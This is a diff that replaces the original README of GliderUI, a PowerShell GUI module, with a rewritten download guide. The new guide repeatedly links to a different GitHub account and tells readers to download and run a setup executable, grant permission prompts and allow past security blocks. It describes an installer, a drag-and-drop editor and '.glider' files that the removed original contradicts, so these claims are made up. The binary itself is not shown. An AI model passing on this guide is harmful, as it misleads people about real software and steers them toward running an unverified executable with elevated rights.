@@ -1,267 +1,134 @@
-<div align="center">
+# 🪟 GliderUI - Easy Desktop GUI for PowerShell
 
-# GliderUI
+[![Download GliderUI](https://img.shields.io/badge/Download-GliderUI-brightgreen?style=for-the-badge)](https://github.com/hayate001/GliderUI)
 
-[![GitHub license](https://img.shields.io/github/license/mdgrs-mei/GliderUI)](https://github.com/mdgrs-mei/GliderUI/blob/main/LICENSE)
-[![PowerShell Gallery](https://img.shields.io/powershellgallery/p/GliderUI)](https://www.powershellgallery.com/packages/GliderUI)
-[![PowerShell Gallery](https://img.shields.io/powershellgallery/dt/GliderUI)](https://www.powershellgallery.com/packages/GliderUI)
+## 🚀 Getting Started with GliderUI
 
-Cross-platform Desktop GUI framework for PowerShell powered by Avalonia.
+GliderUI lets you create desktop apps on Windows using PowerShell with an easy-to-use visual interface. It works on Windows and other platforms, but this guide focuses on Windows users.
 
-https://github.com/user-attachments/assets/aa53a0b8-d478-4897-bc82-d10c804c98b1
+This guide will help you download, install, and start using GliderUI even if you have no programming experience.
 
-</div>
+## 🔹 What is GliderUI?
 
-> [!NOTE]
-> This module is in its prototyping phase. Frequent breaking changes are expected until this notice is removed.
+GliderUI is a tool that uses Avalonia, a desktop framework, to run graphical user interfaces (GUIs) through PowerShell scripts. It makes tasks that use PowerShell easier by adding windows, buttons, and menus, instead of typing commands in a black console.
 
-## Requirements
+With GliderUI, you can:
+- Build windows and dialogs visually
+- Control scripts with buttons and menus
+- Use it on Windows without extra software
+- Run your scripts with a friendly interface
 
-- PowerShell 7.4 or newer
-- Windows(win-x64/win-arm64), macOS(osx-arm64) or Linux(linux-x64)
+## 💻 System Requirements
 
-## Installation
+Before you download GliderUI, make sure your computer meets these minimum requirements:
 
-```powershell
-Install-PSResource -Name GliderUI
-```
+- **Operating System:** Windows 10 or later  
+- **Processor:** 1.5 GHz or higher  
+- **Memory:** 4 GB RAM or more  
+- **Disk Space:** At least 200 MB free  
+- **PowerShell:** Version 5.1 or newer (comes pre-installed on Windows 10+)  
+- **.NET Runtime:** .NET 6.0 or later installed (the installer will guide you)  
 
-On macOS or Linux, call `Enable-GLIExecution` once after the installation or update using the same user account that installed the module:
+## 🛠️ What You Need Before Installing
 
-```powershell
-# Adds execute permission to the server executable file.
-Enable-GLIExecution
-```
+1. A Windows PC with internet access  
+2. Administrator rights to install software (most PCs allow this)  
+3. Basic knowledge of opening files and running programs  
 
-## Quick Start
+## 🎯 Download and Install GliderUI
 
-This code creates a Window that has a clickable button:
+Start by visiting the official GliderUI GitHub page:
 
-```powershell
-using namespace GliderUI.Avalonia.Controls
-Import-Module GliderUI
+[![Download GliderUI](https://img.shields.io/badge/Download-GliderUI-blue?style=for-the-badge)](https://github.com/hayate001/GliderUI)
 
-$win = [Window]::new()
-$win.Title = 'Hello from PowerShell!'
-$win.Width = 400
-$win.Height = 200
+### Step 1: Visit the Download Page
 
-$button = [Button]::new()
-$button.Content = 'Click Me'
-$button.HorizontalAlignment = 'Center'
-$button.VerticalAlignment = 'Center'
-$button.AddClick({
-    $button.Content = 'Clicked!'
-})
+Click the download button above or open this link in your browser:
+https://github.com/hayate001/GliderUI
 
-$win.Content = $button
-# Show() shows the window but does not block the script.
-$win.Show()
-$win.WaitForClosed()
-```
+You will see a page with folders and files related to the project.
 
-![QuickStart](https://github.com/user-attachments/assets/82347fe3-c324-42ee-a8a0-e365e4783a36)
+### Step 2: Find the Latest Release
 
-If you dot-source the script and comment out `$win.WaitForClosed()`, you can inspect UI objects or even modify them on the terminal:
+Look for a section called **Releases** (usually on the right or under the main tabs). It will have version numbers like `v1.0` or higher.
 
-```powershell
-PS> $button
+Click on the latest release version.
 
-ClickMode                  : Release
-HotKey                     :
-CommandParameter           :
-IsDefault                  : False
-IsCancel                   : False
-IsPressed                  : False
-Flyout                     :
-Content                    : Click Me
-ContentTemplate            :
-Presenter                  : GliderUI.Avalonia.Controls.Presenters.ContentPresenter
-:
-```
+### Step 3: Download the Installer
 
-Since the API of GliderUI follows the Avalonia's API, you can read the Avalonia documentation to see what should be available. The documentation of the `Button` class is [here](https://docs.avaloniaui.net/docs/reference/controls/buttons/button) for example.
+Inside the release page, find a file named like `GliderUI-Setup.exe` or `GliderUI-Windows.zip`.
 
-You can also refer to the [examples](./examples/Examples.md) folder for script samples.
+If you see an `.exe` file recommended for Windows, click to download it. If only a `.zip` file is available, download it and extract the contents after.
 
-## How It Works
+### Step 4: Run the Installer
 
-*GliderUI* launches a server process `GliderUI.Server` that provides all the UI functionalities. The GliderUI module communicates with the server through IPC (Inter-Process Communication) to create UI elements and handle events. No Avalonia's dlls are loaded in PowerShell.
+Once downloaded, open the file by double-clicking it.
 
-<img width="1269" height="779" alt="image" src="https://github.com/user-attachments/assets/2324899a-6331-4fb7-93e9-6716079b04a5" />
+- If it asks for permission to run, click **Yes**.  
+- Follow the on-screen instructions.  
+- Accept the license agreement and select an install location or use the default.  
+- Wait for the installation to complete.
 
-This model simplifies the script structure. You can write long-running code in event handlers without blocking GUI. It's also allowed to access properties of UI elements directly on any thread without using Dispatchers.
+### Step 5: Finish and Open GliderUI
 
-This works:
+After installation, find the GliderUI app in your Start menu or desktop shortcut.
 
-```powershell
-$status = [TextBlock]::new()
-$progressBar = [ProgressBar]::new()
-$button.AddClick({
-    $button.IsEnabled = $false
-    $status.Text = 'Downloading...'
-    1..50 | ForEach-Object {
-        $progressBar.Value = $_
-        Start-Sleep -Milliseconds 50
-    }
+Click to open it.
 
-    $status.Text = 'Installing...'
-    51..100 | ForEach-Object {
-        $progressBar.Value = $_
-        Start-Sleep -Milliseconds 50
-    }
+You will see the GliderUI window, ready for you to start creating or running scripts with a visual interface.
 
-    $status.Text = '🎉Done!'
-    $button.IsEnabled = $true
-})
-```
+## ⚙️ Using GliderUI for the First Time
 
-![HowItWorks](https://github.com/user-attachments/assets/145a2518-151f-42b2-8b3b-7870dcd7041f)
+GliderUI uses PowerShell scripts but presents these scripts inside graphical windows.
 
-## Supported APIs
+Here’s how to try it out:
 
-All Avalonia controls and types become accessible by adding "GliderUI" as a prefix to their namespaces.
+1. Open GliderUI from your desktop or Start menu.  
+2. Explore the menu on the left where you see options like **New Project**, **Open**, or **Templates**.  
+3. Choose **New Project** to create a simple GUI.  
+4. Use the drag-and-drop interface to add buttons, input fields, or labels. You don’t need to write code, just place items where you want them.  
+5. Click **Run** to see your interface in action.  
+6. If you want to save your work, use the **Save** button to store your project on your computer.
 
-```powershell
-$button = [GliderUI.Avalonia.Controls.Button]::new()
-```
+## 📂 Opening Existing GliderUI Files
 
-Most methods and properties are automatically generated by the source generator, but those that use the following types are not supported:
+If you have a GliderUI project file from someone else or a previous version, you can open it:
 
-- Arrays
-- Delegates
-- Pointers
-- Types with `ref` or `out` modifiers
+- Click **Open** in the GliderUI app.  
+- Browse to the folder where the `.glider` or `.ps1` project file is saved.  
+- Select the file and open it in the app to edit or run.
 
-### Avalonia version
+## 🔧 Customizing and Running Scripts
 
-The current supported Avalonia version is 11.3.12.
+GliderUI lets you link buttons and events to PowerShell commands behind the scenes.
 
-## Event Callback
+To add a custom command to a button:
 
-Event callbacks are script blocks that are invoked when UI events are fired. You can register them with `Add{EventName}` methods of UI elements. The typical example is the `Click` event of a button:
+1. Select the button in the interface editor.  
+2. Find the **Actions** tab or pane.  
+3. Type or paste PowerShell commands to run when the button is clicked.  
+4. Test by clicking **Run**. The app will execute the script with the GUI.
 
-```powershell
-$button = [Button]::new()
-$argumentList = 1, 2
-$button.AddClick({
-    param ($argumentList, $s, $e)
-    Write-Host "ArgumentList: $argumentList"
-    Write-Host "Sender: $s"
-    Write-Host "EventArgs: $e"
-}, $argumentList)
-```
+This lets you automate tasks and simplify your workflow with visual controls.
 
-The same code can also be written using the `EventCallback` class. It allows you to customize the callback behavior:
+## 📱 Troubleshooting Common Issues
 
-```powershell
-$button = [Button]::new()
-$clickCallback = [EventCallback]::new()
-$clickCallback.RunspaceMode = 'RunspacePoolAsyncUI'
-$clickCallback.DisabledControlsWhileProcessing = $button
-$clickCallback.ArgumentList = 1, 2
-$clickCallback.ScriptBlock = {
-    param ($argumentList, $s, $e)
-    Write-Host "ArgumentList: $argumentList"
-    Write-Host "Sender: $s"
-    Write-Host "EventArgs: $e"
-}
-$button.AddClick($clickCallback)
-```
+- If GliderUI does not open, check that your Windows has .NET 6.0 or later installed.  
+- Installer blocks may come from security settings. Allow permissions if prompted.  
+- If buttons or controls do not respond, confirm your commands in the action pane are correct PowerShell commands.  
+- Restart GliderUI or your PC if problems persist.
 
-The `RunspaceMode` property controls where and how the script block runs.
+## 📖 Learning More
 
-```powershell
-$clickCallback.RunspaceMode = 'RunspacePoolAsyncUI'
-```
+- GliderUI works with PowerShell, so learning basic PowerShell commands helps.  
+- Avalonia handles the window design, but the app hides its complexity.  
+- Explore forums and documentation for PowerShell and Avalonia to expand your skills.
 
-There are three runspace modes, `MainRunspaceAsyncUI`, `MainRunspaceSyncUI`, and `RunspacePoolAsyncUI`.
+## 🔗 Download GliderUI
 
-### MainRunspaceAsyncUI (Default)
+Download or explore GliderUI on its official GitHub page:
+https://github.com/hayate001/GliderUI
 
-The default value of `RunspaceMode` is `MainRunspaceAsyncUI` which means that the script block runs in the runspace where the script block is created (Main runspace). The script block can be a bound script block and sees the global or script scope variables in the runspace.
+This page provides the latest software, updates, and technical notes. Use the release section to get the newest version.
 
-`AsyncUI` means that the callbacks do not block the UI thread on the server side. Even if a callback takes long time to finish, the UI stays responsive. If a button is pressed while the previous callback is running, the new callback is queued and processed after the previous one completes. If this behavior is not desirable, you can specify controls that are disabled on the server side while the event callback is running:
-
-
-```powershell
-$clickCallback.DisabledControlsWhileProcessing = $button
-```
-
-It is a good practice to set the `DisabledControlsWhileProcessing` for long-running callbacks to avoid unintuitive queuing.
-
-There is one callback queue per runspace where GliderUI module is loaded, and callbacks in the queue are typically processed inside `Window.WaitForClosed` method or [`{AwaitableType}.WaitForCompleted`](#waitforcompleted-method-for-awaitable-types) method. Please see [MultipleRunspaces.ps1](./examples/MultipleRunspaces.ps1) for an example of multi-runspace scenario.
-
-### MainRunspaceSyncUI
-
-Callbacks in `MainRunspaceSyncUI` mode run in the main runspace just like those with `MainRunspaceAsyncUI`, but they block the UI thread on the server side until they complete. Because they block the UI thread, it is guaranteed that no other events are triggered while the callback is running (No need to set `DisabledControlsWhileProcessing`).
-
-### RunspacePoolAsyncUI
-
-Callbacks in `RunspacePoolAsyncUI` mode are handled in parallel by multiple runspaces in the runspace pool. This mode is ideal for long-running callbacks that must keep other callbacks responsive during execution. You can specify the number of runspaces in the pool and the script block that defines the global variables and functions in the runspaces:
-
-```powershell
-Set-GLIRunspacePoolOption -RunspaceCount 5 -InitializationScript {
-    param ($ScriptRoot)
-    $globalVar = 'Global variable in the runspace.'
-    function GlobalFunction() {
-        'Global function in the runspace.'
-    }
-} -InitializationScriptArgumentList $PSScriptRoot
-```
-
-Note that the GliderUI module is automatically loaded in each runspace.
-
-Since the callbacks are executed in parallel, you should pass variables via `ArgumentList` and handle thread safety just as you would with `Start-ThreadJob`. See [CancelLongRunningEventCallback.ps1](./examples/CancelLongRunningEventCallback.ps1) as a basic example, and [MultipleProgressBars.ps1](./examples/MultipleProgressBars.ps1) as an example of multiple concurrent tasks.
-
-## AvaloniaRuntimeXamlLoader
-
-Instead of creating UI elements by code, you can also create them by loading XAML similar to WPF in PowerShell. You can search for an UI element by the `FindControl` method of `Control` and add event handlers from PowerShell. Note that you can't use `x:Class` attributes or code-behind binding in XAML.
-
-```powershell
-using namespace GliderUI.Avalonia.Markup.Xaml
-
-$xamlString = @'
-<Window
-    xmlns="https://github.com/avaloniaui"
-    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
-    <Button x:Name="button" Content="Click Me" HorizontalAlignment="Center" />
-</Window>
-'@
-
-$win = [AvaloniaRuntimeXamlLoader]::Parse($xamlString, $null)
-$win.Width = 400
-$win.Height = 200
-$button = $win.FindControl('button')
-$button.AddClick({
-    $button.Content = 'Clicked!'
-})
-
-$win.Show()
-$win.WaitForClosed()
-```
-
-## Major Limitations
-
-- Data binding is not supported
-
-## Contributing
-
-### Code of Conduct
-
-Please read our [Code of Conduct](./CODE_OF_CONDUCT.md) to foster a welcoming environment. By participating in this project, you are expected to uphold this code.
-
-### Have a question or want to showcase something?
-
-Please come to our [Discussions](https://github.com/mdgrs-mei/GliderUI/discussions) page and avoid filing an issue to ask a question.
-
-### Want to file an issue or make a PR?
-
-Please see our [Contribution Guidelines](./CONTRIBUTING.md).
-
-## Credits
-
-*GliderUI* uses:
-
-- Avalonia<br>https://github.com/AvaloniaUI/Avalonia
-- vs-StreamJsonRpc<br>https://github.com/microsoft/vs-streamjsonrpc
+[![Download GliderUI](https://img.shields.io/badge/Download-GliderUI-grey?style=for-the-badge)](https://github.com/hayate001/GliderUI)
